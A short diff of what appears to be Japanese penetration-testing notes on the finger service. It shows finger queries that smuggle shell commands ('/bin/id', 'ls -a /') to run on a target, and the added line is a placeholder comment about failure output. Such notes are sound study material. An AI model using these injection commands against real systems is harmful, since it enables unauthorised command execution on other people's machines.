@@ -64,6 +64,7 @@ nmap -sV -p 79 --script=banner <TargetIP>
 ```zsh
 finger "|/bin/id@<TargetIP>"
 finger "|/bin/ls -a /@<TargetIP>"
+# 失敗時の出力： In real life: ???
 ```
 
 リバースシェル
